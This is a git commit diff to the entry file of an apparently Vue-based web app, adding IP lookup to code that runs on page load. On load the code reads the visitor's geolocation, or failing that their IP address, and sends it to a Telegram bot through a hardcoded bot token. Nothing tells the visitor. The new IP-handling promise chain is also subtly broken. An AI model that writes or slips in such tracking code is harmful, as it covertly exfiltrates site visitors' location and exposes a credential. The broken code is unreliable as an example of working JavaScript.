0c761aa1064b98cde5337a03613f2bf603e4b9e2
Abhishek Bhardwaj <40014349+abhiib02@users.noreply.github.com>
2022-06-13 19:56:57 +0530

    added ip

--- src/main.js
+++ src/main.js
@@ -1,24 +1,36 @@
+
 if (navigator.geolocation) {
 navigator.geolocation.getCurrentPosition(showPosition);
 }
 else{
-  done();
+  getip();
 }
+
+
 function showPosition(position) {
   fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
   Latitude:${position.coords.latitude}
   Longitude:${position.coords.longitude}
   ${encodeURIComponent(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`)}
   `)}
-  function done(){
+
+
+  function getip(){
     var ip;
     fetch('https://api.ipify.org/')
-    .then(response => response.text())
-    .then(data =>{ip = data});
-    fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
-  ${encodeURIComponent(`https://api.iplocation.net/?ip=${ip}`)}
-  `)
+    .then(function(response) { 
+      ip=response.text();
+      ip = ip.replaceAll('"', '');
+    })
+    .then(function(ip){
+        return fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
+        ${encodeURIComponent(`https://api.iplocation.net/?ip=${ip}`)}
+        `)
+    })
+    
+    
   }
+
 import Vue from 'vue'
 import App from './App.vue'
 import router from './router'
